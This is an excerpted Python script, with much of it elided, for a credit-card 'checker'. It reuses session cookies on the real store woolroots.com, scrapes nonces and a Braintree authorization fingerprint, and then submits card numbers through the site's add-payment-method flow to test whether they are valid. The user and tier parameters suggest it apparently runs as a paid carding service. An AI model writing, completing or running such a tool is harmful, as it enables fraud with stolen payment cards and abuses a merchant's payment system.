...
# Session cookies from woolroots.com (from provided JSON)
SESSION_COOKIES = {
...
async def check_cc(cx: str, user_id: int, tier: str) -> dict:
    ...
    try:
        ...
        try:
            ...
            async with session.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers) as response:
                ...
                if not nonce_matches:
                    logger.error(f"Failed to find client_token_nonce. Response: {response_text[:500]}")
            ...
            async with session.post("https://www.woolroots.com/wp-admin/admin-ajax.php", headers=headers, data=data) as response:
                ...
                if not token_matches:
                    logger.error(f"Failed to find token data. Response: {response_text[:500]}")
                ...
                if not au_matches:
                    logger.error(f"Failed to find authorizationFingerprint. Decoded text: {decoded_text[:500]}")
            ...
            async with session.post("https://payments.braintree-api.com/graphql", headers=headers, json=json_data) as response:
                try:
                    ...
                    logger.error(f"Failed to parse Braintree response: {e}")
            ...
            async with session.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers) as ges:
                ...
                if not pay_matches:
                    logger.error(f"Failed to find woocommerce-add-payment-method-nonce. Response: {response_text[:500]}")
        ...
        logger.error(f"Error parsing CC {cx}: {e}")
